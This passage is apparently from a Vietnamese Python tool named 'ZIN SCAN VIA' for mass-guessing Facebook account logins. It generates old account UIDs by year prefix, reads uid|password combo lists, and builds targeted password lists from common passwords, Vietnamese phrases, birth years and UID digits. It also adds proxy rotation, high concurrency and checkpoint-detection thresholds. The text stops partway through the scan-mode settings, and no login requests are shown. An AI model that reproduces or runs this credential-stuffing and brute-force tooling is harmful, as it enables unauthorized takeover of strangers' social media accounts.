#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════╗
║   ZIN SCAN VIA - VĨNH HẰNG THIÊN TÔN          ║
║   Ultimate Edition - All fixes applied       ║
╚══════════════════════════════════════════════╝
"""

import os
import sys
import json
import uuid
import string
import random
import time
import re
import signal
import shutil
import asyncio
import threading
from datetime import datetime
from pathlib import Path

# ─── Kiểm tra thư viện ───
_THIEU = []
try:
    import httpx
except ImportError:
    _THIEU.append("httpx")
try:
    import aiofiles
except ImportError:
    _THIEU.append("aiofiles")
if _THIEU:
    sys.stderr.write(
        f"LỖI: Thiếu thư viện: {', '.join(_THIEU)}\n"
        f"Cài đặt: pip install {' '.join(_THIEU)}\n"
    )
    sys.exit(1)

try:
    _PHIEN_BAN_HTTPX = tuple(
        int(x) for x in httpx.__version__.split(".")[:2] if x.isdigit()
    )
except (ValueError, AttributeError):
    _PHIEN_BAN_HTTPX = (0, 0)

_HTTPX_PROXY_MOI = _PHIEN_BAN_HTTPX >= (0, 26)
if not _HTTPX_PROXY_MOI:
    sys.stderr.write(
        f"[Cảnh báo] httpx {httpx.__version__} < 0.26 — dùng tham số "
        f"'proxies'. Khuyến nghị: pip install -U 'httpx>=0.27'\n"
    )

_STDOUT_KHOA = threading.Lock()
KHUNG_RONG_GOC = 46
_NHA = Path.home()


def _do_thu_muc_mac_dinh():
    try:
        if os.path.isdir("/sdcard") and os.access("/sdcard", os.W_OK):
            return "/sdcard"
    except (OSError, PermissionError):
        pass
    return str(_NHA)


CONFIG = {
    "output_dir": _do_thu_muc_mac_dinh(),
    "state_file": str(_NHA / "zin_state.json"),
    "proxy_file": str(_NHA / "proxies.txt"),
    "concurrency": 120,
    "queue_maxsize": 400,
    "uid_generate_chunk": 40_000,
    "worker_poll_timeout": 0.1,
    "timeout": 10.0,
    "max_retries": 2,
    "retry_backoff": 1.5,
    "rate_limit": 0,
    "enable_proxy": False,
    "enable_resume": True,
    "smart_passwords": True,
    "notify_webhook": "",
    "webhook_timeout": 5.0,
    "max_limit": 1_000_000,
    "verify_tls": True,
    "dry_run": False,
    "beep": False,
    "animation": True,
    "password_min_len": 6,
    "password_max_len": 50,
    "cp_nguong_xac_nhan": 3,
    "cp_so_luong_trigger": 10,
    "cp_cua_so_giay": 60.0,
    "cp_cooldown_giay": 45.0,
    "flag_canh_bao_min_uid": 20,
    "flag_canh_bao_ty_le": 0.40,
    "flag_abort_min_uid": 30,
    "flag_abort_ty_le": 0.60,
}


class C:
    R = '\033[0m'; B = '\033[1m'; D = '\033[2m'
    RED = '\033[38;5;196m'; ORANGE = '\033[38;5;208m'
    YELLOW = '\033[38;5;226m'; GREEN = '\033[38;5;46m'
    CYAN = '\033[38;5;51m'; BLUE = '\033[38;5;27m'
    PURPLE = '\033[38;5;129m'; PINK = '\033[38;5;213m'
    GOLD = '\033[38;5;220m'; WHITE = '\033[38;5;231m'
    GRAY = '\033[38;5;245m'; LIME = '\033[38;5;154m'
    AQUA = '\033[38;5;123m'; VIOLET = '\033[38;5;171m'
    CRIMSON = '\033[38;5;161m'; SKY = '\033[38;5;117m'
    MAGENTA = '\033[38;5;201m'; CORAL = '\033[38;5;203m'
    MINT = '\033[38;5;121m'; CLEAR = '\033[K'


RAINBOW = [C.RED, C.ORANGE, C.YELLOW, C.GREEN, C.CYAN, C.BLUE, C.PURPLE]
RAINBOW2 = [C.PINK, C.CRIMSON, C.CORAL, C.GOLD, C.MINT, C.AQUA, C.SKY, C.VIOLET]
RAINBOW3 = [C.CORAL, C.MAGENTA, C.VIOLET, C.BLUE, C.CYAN, C.LIME, C.YELLOW, C.ORANGE]
SPINNER = ["|", "/", "-", "\\"]

_ANSI_RE = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07')


def _rong_terminal():
    try:
        c = int(os.environ.get("COLUMNS", "0"))
        if c > 0:
            return c
    except (ValueError, TypeError):
        pass
    for fd in (sys.stdout.fileno(), 0, 1, 2):
        try:
            return os.get_terminal_size(fd).columns
        except (OSError, ValueError, AttributeError):
            continue
    return 50


def _rong_khung():
    tw = _rong_terminal()
    return max(24, min(KHUNG_RONG_GOC, tw - 4))


def _rong_hien_thi(s):
    return len(_ANSI_RE.sub('', s))


def _cat_theo_rong(s, toi_da):
    if _rong_hien_thi(s) <= toi_da:
        return s
    out = []
    dem = 0
    i, n = 0, len(s)
    while i < n:
        m = _ANSI_RE.match(s, i)
        if m:
            out.append(m.group())
            i = m.end()
            continue
        if dem >= toi_da:
            break
        out.append(s[i])
        dem += 1
        i += 1
    out.append(C.R)
    return ''.join(out)


def co_ho_tro_ansi():
    try:
        if os.environ.get("TERM", "").lower() == "dumb":
            return False
        try:
            if not sys.stdout.isatty():
                if not (os.environ.get("TERMUX_VERSION") or
                        os.environ.get("PREFIX", "").find("termux") >= 0):
                    return False
        except (OSError, AttributeError):
            pass
        return True
    except Exception:
        return True


_HOAT_HINH_OK = co_ho_tro_ansi() and CONFIG["animation"]


def mau_cau_vong(text, palette=None, do_lech=0):
    palette = palette or RAINBOW
    return "".join(palette[(i + do_lech) % len(palette)] + ch
                   for i, ch in enumerate(text)) + C.R


def vien_cau_vong(ky_tu="═", rong=None, palette=None, do_lech=0):
    if rong is None:
        rong = _rong_khung()
    palette = palette or RAINBOW
    return "".join(palette[(i + do_lech) % len(palette)] + ky_tu
                   for i in range(rong)) + C.R


def hop_can_giua(text, rong=None):
    if rong is None:
        rong = _rong_khung()
    if len(text) + 2 > rong:
        text = text[:max(1, rong - 4)]
    tren = "╔" + "═" * (rong - 2) + "╗"
    duoi = "╚" + "═" * (rong - 2) + "╝"
    trong = "║" + " " * (rong - 2) + "║"
    le_trai = (rong - 2 - len(text)) // 2
    le_phai = (rong - 2 - len(text)) - le_trai
    print(mau_cau_vong(tren))
    print(mau_cau_vong(trong, palette=RAINBOW2))
    print(C.CYAN + "║" + C.R + " " * le_trai +
          mau_cau_vong(text, palette=RAINBOW) +
          " " * le_phai + C.CYAN + "║" + C.R)
    print(mau_cau_vong(trong, palette=RAINBOW2))
    print(mau_cau_vong(duoi))


def vach_ngan():
    print(f"  {C.GRAY}{'·' * _rong_khung()}{C.R}")


def tieng_keo():
    if CONFIG["beep"]:
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass


def hieu_ung_song(text, palette=None, thoi_gian=1.5, do_tre=0.07, le="  "):
    if not text:
        return
    palette = palette or RAINBOW
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{mau_cau_vong(text, palette=palette)}")
        return
    bat_dau = time.time()
    do_lech = 0
    while time.time() - bat_dau < thoi_gian:
        chu_mau = "".join(
            palette[(i + do_lech) % len(palette)] + ch
            for i, ch in enumerate(text)
        )
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r{le}{chu_mau}{C.R}\033[K")
                sys.stdout.flush()
        except OSError:
            return
        do_lech += 1
        time.sleep(do_tre)
    chu_cuoi = "".join(palette[i % len(palette)] + ch
                       for i, ch in enumerate(text))
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r{le}{chu_cuoi}{C.R}\033[K\n")
            sys.stdout.flush()
    except OSError:
        pass


def nhap_nhay(text, mau=None, so_lan=3, do_tre=0.18, le="  "):
    mau = mau or C.GOLD
    if not _HOAT_HINH_OK or so_lan <= 0:
        print(f"{le}{mau}{C.B}{text}{C.R}")
        return
    for _ in range(so_lan):
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r{le}{mau}{C.B}{text}{C.R}\033[K")
                sys.stdout.flush()
            time.sleep(do_tre)
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r{le}{C.D}{text}{C.R}\033[K")
                sys.stdout.flush()
            time.sleep(do_tre)
        except OSError:
            return
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r{le}{mau}{C.B}{text}{C.R}\033[K\n")
            sys.stdout.flush()
    except OSError:
        pass


def cham_cho(text="Đang xử lý", thoi_gian=1.2, mau=None, le="  "):
    mau = mau or C.CYAN
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{mau}{text}...{C.R}")
        return
    bat_dau = time.time()
    i = 0
    while time.time() - bat_dau < thoi_gian:
        dau_cham = ("." * (i % 4)).ljust(4)
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(
                    f"\r{le}{mau}{text}{dau_cham}{C.R}\033[K")
                sys.stdout.flush()
        except OSError:
            return
        i += 1
        time.sleep(0.15)
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r{le}{mau}{text}...{C.R}\033[K\n")
            sys.stdout.flush()
    except OSError:
        pass


def xoay_tron(text, thoi_gian=1.0, mau=None, le="  ", bieu_tuong_ket="✓"):
    mau = mau or C.CYAN
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{C.GREEN}{bieu_tuong_ket}{C.R} {mau}{text}{C.R}")
        return
    bat_dau = time.time()
    i = 0
    while time.time() - bat_dau < thoi_gian:
        xoay = SPINNER[i % len(SPINNER)]
        mau_xoay = RAINBOW[i % len(RAINBOW)]
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(
                    f"\r{le}{mau_xoay}{xoay}{C.R} {mau}{text}{C.R}\033[K")
                sys.stdout.flush()
        except OSError:
            return
        i += 1
        time.sleep(0.08)
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(
                f"\r{le}{C.GREEN}{bieu_tuong_ket}{C.R} "
                f"{mau}{text}{C.R}\033[K\n")
            sys.stdout.flush()
    except OSError:
        pass


class TieuDeDong:
    def __init__(self):
        self._dung = False
        self._luong = None
        self._thong_ke = None
        self._cho_phep = threading.Event()
        self._cho_phep.set()
        self._khung = [
            "⚡ ZIN TOOL SCAN ⚡",
            "🔥 VĨNH HẰNG THIÊN TÔN 🔥",
            "✨ Đang quét... ✨",
            "🎯 Vô Thượng Pháp Trận 🎯",
        ]

    def bat_dau(self, thong_ke):
        self._thong_ke = thong_ke
        self._dung = False
        self._luong = threading.Thread(target=self._vong_lap, daemon=True)
        self._luong.start()

    def dung(self):
        self._dung = True
        self._cho_phep.set()

    def _vong_lap(self):
        i = 0
        while not self._dung:
            if not self._cho_phep.wait(timeout=1.0):
                continue
            if self._dung:
                return
            try:
                if self._thong_ke:
                    ts = self._thong_ke
                    tieu_de = (
                        f"ZIN | OK:{ts.thanh_cong} "
                        f"CPT:{ts.cp_that} CP?:{ts.cp_nghi_ngo} "
                        f"| UID:{ts.uid_da_xu_ly}/{ts.uid_tong} "
                        f"| {ts.toc_do_uid():.1f}/s"
                    )
                    if i % 4 == 0:
                        khung = self._khung[(i // 4) % len(self._khung)]
                        tieu_de = f"{khung} | {tieu_de}"
                else:
                    tieu_de = self._khung[i % len(self._khung)]
                with _STDOUT_KHOA:
                    sys.stdout.write(f"\033]0;{tieu_de}\007")
                    sys.stdout.flush()
            except OSError:
                return
            i += 1
            time.sleep(1.5)


def in_logo(hoat_hinh=True):
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except OSError:
        pass
    print()
    print("  " + vien_cau_vong("✦"))
    print()
    hop_can_giua("ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN")
    print()
    rong_k = _rong_khung()
    nhan = " ⚡ Vô Thượng Pháp Trận ⚡ "
    gach = "─" * max(2, (rong_k - len(nhan)) // 2)
    dong_trang_tri = gach + nhan + gach
    if hoat_hinh and _HOAT_HINH_OK:
        hieu_ung_song(dong_trang_tri, palette=RAINBOW3,
                      thoi_gian=0.6, do_tre=0.05)
    else:
        print("  " + mau_cau_vong(dong_trang_tri, palette=RAINBOW3))
    print()
    print("  " + vien_cau_vong("✦", palette=RAINBOW2))
    print()


def in_logo_vo_han():
    if not _HOAT_HINH_OK:
        in_logo(hoat_hinh=False)
        return
    import select
    rong_k = _rong_khung()
    nhan_tag = " ⚡ Vô Thượng Pháp Trận ⚡ "
    gach_tag = "─" * max(2, (rong_k - len(nhan_tag)) // 2)
    dong_tag = gach_tag + nhan_tag + gach_tag
    tieu_de = "ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN"
    if len(tieu_de) + 2 > rong_k:
        tieu_de = tieu_de[:max(1, rong_k - 4)]
    tren = "╔" + "═" * (rong_k - 2) + "╗"
    duoi = "╚" + "═" * (rong_k - 2) + "╝"
    trong = "║" + " " * (rong_k - 2) + "║"
    le_trai = (rong_k - 2 - len(tieu_de)) // 2
    le_phai = (rong_k - 2 - len(tieu_de)) - le_trai

    def ve(do_lech):
        lines = ["", "  " + "".join(
            RAINBOW[(i + do_lech) % len(RAINBOW)] + "✦"
            for i in range(rong_k)
        ) + C.R, ""]
        lines.append(mau_cau_vong(tren, do_lech=do_lech))
        lines.append(mau_cau_vong(trong, palette=RAINBOW2, do_lech=do_lech))
        chu_td = "".join(
            RAINBOW[(j + do_lech) % len(RAINBOW)] + ch
            for j, ch in enumerate(tieu_de)
        )
        lines.append(C.CYAN + "║" + C.R + " " * le_trai +
                     chu_td + " " * le_phai + C.CYAN + "║" + C.R)
        lines.append(mau_cau_vong(trong, palette=RAINBOW2, do_lech=do_lech))
        lines.append(mau_cau_vong(duoi, do_lech=do_lech))
        lines.append("")
        tag = "".join(
            RAINBOW3[(i + do_lech) % len(RAINBOW3)] + ch
            for i, ch in enumerate(dong_tag)
        ) + C.R
        lines.append("  " + tag)
        lines.append("")
        lines.append("  " + "".join(
            RAINBOW2[(i + do_lech) % len(RAINBOW2)] + "✦"
            for i in range(rong_k)
        ) + C.R)
        lines.append("")
        lines.append(
            f"  {C.GRAY}▸ Nhấn {C.WHITE}{C.B}Enter{C.R}"
            f"{C.GRAY} để tiếp tục...{C.R}"
        )
        return "\n".join(lines)

    try:
        with _STDOUT_KHOA:
            sys.stdout.write("\033[?25l")
            sys.stdout.flush()
        do_lech = 0
        while True:
            khung = ve(do_lech)
            with _STDOUT_KHOA:
                sys.stdout.write("\033[H\033[J" + khung)
                sys.stdout.flush()
            try:
                r, _, _ = select.select([sys.stdin], [], [], 0.08)
                if r:
                    try:
                        sys.stdin.readline()
                    except (OSError, EOFError):
                        pass
                    break
            except (OSError, ValueError):
                time.sleep(0.08)
            do_lech += 1
    finally:
        with _STDOUT_KHOA:
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except OSError:
            pass


SERIES_MAP = {
    "1": ("2011-2012", ("100009",), 9),
    "2": ("2010", ("10001",), 10),
    "3": ("2009", ("1000000", "1000001", "1000002",
                   "1000003", "1000004", "1000005"), 9),
    "4": ("2008", ("1000000",), 8),
    "5": ("2007", ("10000000",), 7),
    "6": ("2005-2006", ("100000000",), 6),
    "7": ("NGẪU NHIÊN", "NGẪU NHIÊN", 0),
}

NHOM_TIEN_TO_NGAU_NHIEN = (
    ("100009", 9), ("10001", 10), ("100001", 9), ("100011", 9),
    ("1000000", 8), ("1000001", 8), ("1000010", 8), ("1000100", 8),
    ("1000002", 8), ("1000101", 8),
    ("10000000", 7), ("10000001", 7), ("10000010", 7),
    ("10000100", 7), ("10001000", 7),
    ("100000000", 6), ("100000001", 6), ("100000010", 6),
    ("100000100", 6), ("100001000", 6), ("100010000", 6),
    ("1000000000", 5), ("1000000001", 5), ("1000000010", 5),
    ("100000", 9), ("100010", 9), ("100100", 9),
)


class BoSinhUID:
    def __init__(self, prefixes, do_dai_than, la_ngau_nhien=False):
        self.la_ngau_nhien = la_ngau_nhien
        self.prefixes = tuple(prefixes) if not la_ngau_nhien else None
        self.do_dai_than = do_dai_than
        self._trang_thai = {}
        self._tong_da_sinh = 0

    def _chon_cap(self):
        if self.la_ngau_nhien:
            return random.choice(NHOM_TIEN_TO_NGAU_NHIEN)
        return (random.choice(self.prefixes), self.do_dai_than)

    def _khoi_tao_counter(self, prefix, do_dai):
        mod = 10 ** do_dai
        start = random.randint(0, mod - 1)
        step = random.randint(1, mod - 1)
        while step % 2 == 0 or step % 5 == 0:
            step = random.randint(1, mod - 1)
        self._trang_thai[(prefix, do_dai)] = [start, step, 0]

    def sinh_mot(self):
        prefix, do_dai = self._chon_cap()
        key = (prefix, do_dai)
        if key not in self._trang_thai:
            self._khoi_tao_counter(prefix, do_dai)
        start, step, cnt = self._trang_thai[key]
        mod = 10 ** do_dai
        n = (start + cnt * step) % mod
        self._trang_thai[key][2] = cnt + 1
        self._tong_da_sinh += 1
        return prefix + str(n).zfill(do_dai)

    def sinh_lo(self, so_luong):
        return [self.sinh_mot() for _ in range(so_luong)]

    def so_da_sinh(self):
        return self._tong_da_sinh

    def canh_bao_gan_can(self, nguong=0.5):
        canh_bao = []
        for (prefix, do_dai), st in self._trang_thai.items():
            mod = 10 ** do_dai
            if st[2] / mod >= nguong:
                canh_bao.append(
                    f"prefix={prefix} len={do_dai}: "
                    f"{st[2]}/{mod} ({st[2]/mod*100:.1f}%)"
                )
        return canh_bao


def _parse_dong_uid_pw(dong):
    if not dong:
        return None
    dong = dong.strip()
    if not dong or dong.startswith("#") or dong.startswith("//"):
        return None
    parts = None
    for delim in ('|', ':', ';', ',', '\t'):
        if delim in dong:
            parts = dong.split(delim, 1)
            break
    if parts is None:
        parts = dong.split(None, 1)
    if not parts or len(parts) < 2:
        return None
    uid = parts[0].strip().strip('"\'')
    pw = parts[1].strip().strip('"\'')
    if not uid or not pw:
        return None
    if not uid.isdigit() or len(uid) < 6:
        return None
    if not (1 <= len(pw) <= 100):
        return None
    return uid, pw


class BoDocFile:
    def __init__(self, duong_dan):
        self.duong_dan = Path(duong_dan)
        self.tong_dong = 0
        self.hop_le = 0
        self.bo_qua = 0
        self.trung_lap = 0
        self.danh_sach = []
        self._tap_da_co = set()
        self._vi_du = []

    def doc(self):
        try:
            with open(self.duong_dan, 'r', encoding='utf-8',
                      errors='ignore') as f:
                for dong in f:
                    self.tong_dong += 1
                    kq = _parse_dong_uid_pw(dong)
                    if kq is None:
                        self.bo_qua += 1
                        continue
                    uid, pw = kq
                    khoa = (uid, pw)
                    if khoa in self._tap_da_co:
                        self.trung_lap += 1
                        continue
                    self._tap_da_co.add(khoa)
                    self.danh_sach.append(khoa)
                    self.hop_le += 1
                    if len(self._vi_du) < 3:
                        self._vi_du.append((uid, pw))
        except OSError as e:
            raise IOError(f"Không đọc được file: {e}")
        return self.danh_sach

    def vi_du(self):
        return self._vi_du


def _parse_dong_uid(dong):
    if not dong:
        return []
    dong = dong.strip()
    if not dong or dong.startswith("#") or dong.startswith("//"):
        return []
    tokens = re.split(r'[\s,;|]+', dong)
    ket_qua = []
    for t in tokens:
        t = t.strip().strip('"\'')
        if not t:
            continue
        if t.isdigit() and 6 <= len(t) <= 20:
            ket_qua.append(t)
    return ket_qua


class BoDocUID:
    def __init__(self):
        self.tong_dong = 0
        self.hop_le = 0
        self.bo_qua = 0
        self.trung_lap = 0
        self.danh_sach = []
        self._tap = set()
        self._vi_du = []

    def them_dong(self, dong):
        self.tong_dong += 1
        ds = _parse_dong_uid(dong)
        if not ds:
            self.bo_qua += 1
            return 0
        dem_moi = 0
        for uid in ds:
            if uid in self._tap:
                self.trung_lap += 1
                continue
            self._tap.add(uid)
            self.danh_sach.append(uid)
            self.hop_le += 1
            dem_moi += 1
            if len(self._vi_du) < 3:
                self._vi_du.append(uid)
        return dem_moi

    def doc_file(self, duong_dan):
        try:
            with open(duong_dan, 'r', encoding='utf-8',
                      errors='ignore') as f:
                for dong in f:
                    self.them_dong(dong)
        except OSError as e:
            raise IOError(f"Không đọc được file: {e}")
        return self.danh_sach

    def vi_du(self):
        return self._vi_du


UID_YEAR_MAP = (
    ("100009", 9, "2011-2012"),
    ("10001", 10, "2010"),
    ("1000000", 9, "2009"),
    ("1000000", 8, "2008"),
    ("10000000", 7, "2007"),
    ("100000000", 6, "2005-2006"),
    ("1000000000", 5, "2004-"),
    ("100001", 9, "2011-2012"),
    ("100011", 9, "2011-2012"),
    ("1000001", 8, "2008"),
    ("1000010", 8, "2008"),
    ("1000100", 8, "2008"),
    ("1000002", 8, "2008"),
    ("1000101", 8, "2008"),
    ("1000003", 9, "2009"),
    ("1000004", 9, "2009"),
    ("1000005", 9, "2009"),
    ("10000001", 7, "2007"),
    ("10000010", 7, "2007"),
    ("10000100", 7, "2007"),
    ("10001000", 7, "2007"),
    ("100000001", 6, "2005-2006"),
    ("100000010", 6, "2005-2006"),
    ("100000100", 6, "2005-2006"),
    ("100001000", 6, "2005-2006"),
    ("100010000", 6, "2005-2006"),
    ("1000000001", 5, "2004-"),
    ("1000000010", 5, "2004-"),
    ("100000", 9, "2011-2012"),
    ("100010", 9, "2011-2012"),
    ("100100", 9, "2011-2012"),
)
_UID_YEAR_SAP_XEP = tuple(sorted(UID_YEAR_MAP, key=lambda x: -len(x[0])))


def lay_nam_tai_khoan(uid):
    """Chỉ trả năm khi prefix khớp chính xác, còn lại '?'"""
    if not uid or not uid.isdigit():
        return "?"
    for tien_to, do_dai, nam in _UID_YEAR_SAP_XEP:
        if uid.startswith(tien_to) and len(uid) == len(tien_to) + do_dai:
            return nam
    return "?"


TOP_MAT_KHAU = (
    '123456', '12345678', '123456789', '1234567', '1234567890',
    'abc123', 'qwerty', 'password', '123123', '111111',
    '000000', 'iloveyou', '123456a', '12345678a', 'admin',
    'password123', 'welcome', 'monkey', 'login', 'abc12345',
    'matkhau', 'khongcopass', 'yeuem', 'yeu123', 'chaoem',
    'anhyeuem', 'emyeuanh', 'thanhcong', 'vietnam', 'hanoi',
)

TOP_60_MAT_KHAU = (
    '123456', '123456789', '12345678', 'password', 'qwerty',
    '1234567890', '1234567', 'qwerty123', '1q2w3e', 'abc123',
    'iloveyou', '11111111', 'password1', 'qwertyuiop', '654321',
    '123321', '666666', '88888888', '123456a', '555555',
    '1qaz2wsx', '222222', '1111111', '123abc', '121212',
    '7777777', 'asdfghjkl', 'zxcvbnm', '112233', '123456789a',
    '987654321', '123123123', '1q2w3e4r', 'qazwsx', 'aa123456',
    'a123456', '123qwe', '1qazxsw2', 'password123', 'admin123',
    'welcome', 'monkey', 'dragon', 'master', 'letmein',
    'football', 'baseball', 'superman', 'batman', 'naruto',
    'onepiece', 'facebook', 'khongcopass',
)

_BASE_CO_BAN = (
    '123456', '1234567', '12345678', '123456789', '1234567890',
    '111111', '222222', '333333', '444444', '555555',
    '666666', '777777', '888888', '999999', '000000',
    '00000000', '11111111', '0987654321',
    '987654321', '9876543210', '1234554321',
    '123123', '112233', '121212', '123321', '456456',
    '654321', '11223344', '1122334455', '556677', '778899',
    '010203', '111222', '111222333', '123123123',
    'password', 'password123', 'password1234',
    'qwerty', 'qwerty123', 'qwertyuiop', 'qwertyuiop123',
    'qwerty1', 'qwerty12', 'qwerty1234',
    'abc123', 'abc12345', 'abcd1234', 'abc1234',
    'abcabc', 'abcxyz', 'abc000', 'abc111', 'abc222',
    'abc333', 'abc444', 'abc555',
    'iloveyou', 'admin', 'welcome', 'monkey', 'login',
    'letmein', 'admin123', 'admin@123',
    'guest123', 'test1234', 'test12345',
    'Aa123456', 'aA123456', 'Aa123456789', '123456Aa',
    '123456aA', '123456789Aa', 'A123456', 'a123456',
    '12345678Aa', '12345678a',
    '1q2w3e4r', '1qaz2wsx', '1qazxsw2', 'zaq12wsx',
    'qwe123', 'asd123', 'zxc123',
    'qazwsx', 'qazwsxedc', 'qazwsx123',
    'qweasd', 'qweasdzxc', 'qweasd123',
    'asdf1234', 'asdfgh', 'asdfgh123', 'asdf123',
    'asdfghjkl', 'asdfghjkl123',
    'zxcvbn', 'zxcvbnm', 'zxcvbnm123', 'zxcvbn123',
    '1234qwer', 'qwer1234',
    '123456789a', 'a123456789',
    'love123', 'loveyou', 'iloveu123',
    'hello123', 'hi12345', 'hey12345',
    'facebook', 'facebook123', 'fb123456',
    'google123', 'gmail123',
    'coffee123', 'music123', 'football123',
    'superman123', 'batman123', 'naruto123',
    'khongcopass', 'khongcomatkhau', 'khongcomatkhau123',
    'matkhau', 'matkhau123',
)

_BASE_TIENG_VIET = (
    'yeuem', 'yeuanh', 'yeu123', 'yeu123456',
    'anhyeuem', 'emyeuanh', 'yeuemnhieu', 'yeuanhnhieu',
    'nhoye', 'nhoem', 'nhoanh', 'nhieu',
    'me12345', 'meocon', 'meocon123',
    'ba12345', 'ong12345', 'noi12345',
    'conyeu', 'con12345',
    'banthan', 'banthan123',
    'banbe123', 'anh12345', 'em12345',
    'vui12345', 'buon12345',
    'hanhphuc', 'hanhphuc123', 'camon123',
    'chaoem123', 'chaonhe123', 'chaomung123',
    '0901234567', '0912345678', '0987654321',
    'vietnam', 'vietnam123', 'vietnam2024', 'vietnamese',
    'saigon', 'saigon123', 'hanoi', 'hanoi123',
    'danang', 'danang123', 'hue12345',
    'cantho', 'cantho123', 'vungtau', 'nhatrang',
    'sinhnhat', 'sinhnhat123',
    'ngaysinh', 'ngaythang',
    'thanhcong', 'thanhcong123', 'thanhcong2024',
    'hocgioi', 'hocsinh', 'sinhvien',
)


class ChienLuocMatKhau:
    @staticmethod
    def _loc(tap):
        mn = CONFIG["password_min_len"]
        mx = CONFIG["password_max_len"]
        return [mk for mk in tap if mk and mn <= len(mk) <= mx]

    @staticmethod
    def _tao_nhanh(uid):
        tap = list(TOP_MAT_KHAU)
        chu_so = re.findall(r'\d+', uid)
        if chu_so:
            duoi = chu_so[-1]
            duoi_8 = duoi[-8:] if len(duoi) >= 8 else duoi
            duoi_6 = duoi[-6:] if len(duoi) >= 6 else duoi
            tap.insert(0, duoi)
            tap.insert(1, duoi_8)
            tap.insert(2, duoi_6)
            tap.insert(4, duoi_6 + "123")
            tap.insert(5, duoi_6 + "a")
            tap.insert(6, "a" + duoi_6)
            tap.insert(7, duoi_8 + "123")
        return ChienLuocMatKhau._loc(tap)

    @staticmethod
    def _tao_base_vn():
        tap = set()
        tap.update(_BASE_CO_BAN)
        tap.update(_BASE_TIENG_VIET)
        for nam in range(1950, 2025):
            nam_s = str(nam)
            if nam >= 1990:
                tap.add("sinh" + nam_s)
                tap.add("fb" + nam_s)
                tap.add("pass" + nam_s)
                tap.add(nam_s + "abc")
                tap.add("abc" + nam_s)
        tap = ChienLuocMatKhau._loc(tap)
        tap_set = set(tap)
        uu_tien = sorted([mk for mk in tap_set if mk in TOP_MAT_KHAU])
        con_lai = sorted([mk for mk in tap_set if mk not in TOP_MAT_KHAU])
        return uu_tien + con_lai

    @staticmethod
    def _tao_uid_patterns(uid):
        tap = set()
        if not CONFIG["smart_passwords"]:
            return tap
        chu_so = re.findall(r'\d+', uid)
        if not chu_so:
            return tap
        duoi = chu_so[-1]
        do_dai = len(duoi)
        duoi_list = []
        for n in (10, 8, 7, 6, 5, 4, 3):
            if do_dai >= n:
                duoi_list.append(duoi[-n:])
        duoi_list.append(duoi)
        duoi_list = list(dict.fromkeys(duoi_list))

        for bien_the in duoi_list:
            if not bien_the:
                continue
            tap.add(bien_the)
            tap.add(bien_the[::-1])
            for hau in ('1', '12', '123', '1234', '12345',
                         '123456', '0', '00', '000',
                         'a', 'A', 'ab', 'Ab',
                         '@', '@123', '#', '!', '.', '_', '-',
                         'vip', 'pro', 'love', 'boy', 'girl',
                         'abc', 'xyz'):
                tap.add(bien_the + hau)
                tap.add(hau + bien_the)
            for nam in ("1990", "1991", "1992", "1993",
                         "1994", "1995", "1996", "1997",
                         "1998", "1999", "2000", "2001",
                         "2002", "2003", "2004", "2005",
                         "2006", "2007", "2008", "2009",
                         "2010", "2011", "2012"):
                tap.add(bien_the + nam)
                tap.add(nam + bien_the)
            for y2 in ("90", "91", "92", "93", "94", "95",
                       "96", "97", "98", "99", "00", "01",
                       "02", "03", "04", "05", "06", "07",
                       "08", "09", "10", "11", "12"):
                tap.add(bien_the + y2)
                tap.add(y2 + bien_the)

        if len(duoi) >= 9:
            tap.add(duoi[:6] + duoi[-3:])
            tap.add(duoi[-3:] + duoi[:6])
        if len(duoi) >= 12:
            tap.add(duoi[:6] + duoi[-6:])
            tap.add(duoi[-6:] + duoi[:6])
        if len(duoi) >= 10:
            tap.add(duoi[:5] + duoi[-5:])
            tap.add(duoi[-5:] + duoi[:5])
        if len(duoi) >= 4:
            tap.add(duoi[-4:] * 2)
            tap.add(duoi[-4:] * 3)
        if len(duoi) >= 3:
            tap.add(duoi[-3:] * 3)
            tap.add(duoi[-3:] * 4)
        if len(duoi) >= 6:
            tap.add("khongcopass" + duoi[-6:])
            tap.add("khongcomatkhau" + duoi[-6:])
            tap.add("matkhau" + duoi[-6:])
        return set(ChienLuocMatKhau._loc(tap))

    @staticmethod
    def tao_danh_sach_nhanh(uid):
        return ChienLuocMatKhau._tao_nhanh(uid)

    @staticmethod
    def tao_danh_sach(uid, mode="supreme"):
        if mode == "fast":
            return ChienLuocMatKhau._loc(TOP_60_MAT_KHAU)
        base_vn = ChienLuocMatKhau._tao_base_vn()
        if mode == "balanced":
            n = max(1, int(len(base_vn) * 0.7))
            return base_vn[:n]
        if mode == "thorough":
            return base_vn
        uid_pat = ChienLuocMatKhau._tao_uid_patterns(uid)
        if not uid_pat:
            return base_vn
        tap = set(base_vn) | uid_pat
        uu_tien = sorted([mk for mk in tap if mk in TOP_MAT_KHAU])
        con_lai = sorted([mk for mk in tap if mk not in TOP_MAT_KHAU])
        ket_qua = uu_tien + con_lai
        return ChienLuocMatKhau._loc(ket_qua)


SCAN_MODES = {
    "1": {"name": "SCAN NHANH", "icon": "⚡", "color": C.LIME,
          "min_workers": 10, "max_workers": 200, "default_workers": 150,
          "password_mode": "fast", "desc": "60 mật khẩu phổ biến toàn cầu"},
    "2": {"name": "SCAN CÂN BẰNG", "icon": "⚖", "color": C.CYAN,
          "min_workers": 40, "max_workers": 300, "default_workers": 120,
          "password_mode": "balanced", "desc": "70% password Base + VN"},
